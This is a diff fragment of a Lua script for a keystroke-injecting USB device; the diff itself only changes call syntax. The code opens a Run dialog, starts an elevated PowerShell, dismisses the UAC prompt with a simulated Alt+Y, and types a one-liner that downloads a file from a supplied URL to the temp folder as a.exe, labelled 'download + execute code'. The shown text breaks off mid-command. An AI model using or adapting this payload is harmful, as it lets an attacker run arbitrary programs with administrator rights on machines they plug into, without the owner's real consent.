@@ -29,24 +29,24 @@ while true do
     if runAs then
         -- when running elevated prompt sometimes it pops in background, so we need
         -- to go to the desktop
-        kb.chord(MOD_LSUPER, KEY_D)
+        kb:chord(MOD_LSUPER, KEY_D)
         wait(500)
-        kb.chord(MOD_LSUPER, KEY_R)
+        kb:chord(MOD_LSUPER, KEY_R)
         wait(2000)
-        kb.string("powershell Start-Process powershell -Verb runAs\n")
+        kb:string("powershell Start-Process powershell -Verb runAs\n")
         wait(3000)
-        kb.chord(MOD_LALT, KEY_Y)
+        kb:chord(MOD_LALT, KEY_Y)
         wait(2000)
     else
-        kb.chord(MOD_LSUPER, KEY_R)
+        kb:chord(MOD_LSUPER, KEY_R)
         wait(2000)
-        kb.string("powershell\n")
+        kb:string("powershell\n")
         wait(2000)
     end
 
     print("download + execute code")
 
-    kb.string(
+    kb:string(
             "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$d=New-Object System.Net.WebClient;" ..
                     "$u='" .. file .. "';" ..
                     "$f=\"$Env:Temp\\a.exe\";$d.DownloadFile($u,$f);" ..
